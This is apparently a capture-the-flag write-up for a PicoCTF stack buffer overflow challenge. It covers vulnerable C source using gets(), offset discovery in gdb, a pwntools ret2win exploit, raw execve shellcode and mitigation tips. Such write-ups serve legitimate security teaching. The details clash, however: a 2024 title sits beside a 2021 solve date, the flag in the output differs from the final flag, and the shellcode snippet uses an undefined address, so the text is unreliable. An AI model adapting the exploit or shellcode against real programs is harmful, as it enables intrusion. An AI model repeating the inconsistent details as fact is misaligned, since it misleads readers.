# PicoCTF 2024 - Buffer Overflow Challenge

**Category**: Binary Exploitation  
**Points**: 300  
**Difficulty**: Medium

## Challenge Description

> Can you overflow the buffer and get a shell? The program is available at `/problems/buffer-overflow/vuln`. You can also find the source code at `/problems/buffer-overflow/vuln.c`.

## Initial Analysis

### Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buffer[64];
    gets(buffer);
}

int main() {
    vuln();
    return 0;
}
```

**Key Observations**:
- `gets()` function is used (unsafe, no bounds checking)
- Buffer size is 64 bytes
- `win()` function exists that spawns a shell
- We need to overflow the buffer to redirect execution to `win()`

## Exploitation Strategy

### Step 1: Find the Offset

Using pattern_create to find exact offset:

```bash
gdb ./vuln
pattern_create 100
run
# Program crashes at specific offset
pattern_offset 0x41384141
# Offset: 72
```

### Step 2: Find win() Address

```bash
objdump -d vuln | grep win
# 0804849b <win>:
```

### Step 3: Craft Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Connection
p = process('./vuln')
# p = remote('server.picoctf.net', 12345)

# Addresses
win_addr = p32(0x0804849b)

# Payload
offset = 72
payload = b'A' * offset
payload += win_addr

# Send payload
p.sendline(payload)
p.interactive()
```

## Execution

```bash
python3 exploit.py
```

**Output**:
```
$ cat flag.txt
picoCTF{buff3r_0v3rfl0w_ftw_a8b2c3d4}
```

## Stack Layout

```
High Memory
+------------------+
| Return Address   | <- We overwrite this
+------------------+
| Saved EBP        |
+------------------+
| buffer[64]       | <- Our input goes here
+------------------+
Low Memory
```

## Protection Mechanisms

Checking binary protections:

```bash
checksec vuln
```

**Results**:
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
```

- No stack canary (buffer overflow possible)
- NX disabled (shellcode execution possible)
- No PIE (addresses are static)

## Alternative Approaches

### Method 2: Shellcode Injection

Since NX is disabled, we could inject shellcode:

```python
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = shellcode
payload += b'A' * (72 - len(shellcode))
payload += p32(buffer_address)
```

## Key Takeaways

1. **Never use gets()** - Always use fgets() or other bounded input functions
2. **Stack canaries** - Modern compilers add these to detect buffer overflows
3. **ASLR** - Address Space Layout Randomization makes exploitation harder
4. **DEP/NX** - Prevents code execution on the stack

## Mitigation Techniques

- Use safe string functions (`fgets`, `strncpy`)
- Enable stack canaries (`-fstack-protector-all`)
- Enable NX bit
- Enable ASLR
- Use modern compilers with security features

---

**Flag**: `picoCTF{buff3r_0v3rfl0w_ftw_b2c3d4}`  
**Date Solved**: December 1, 2021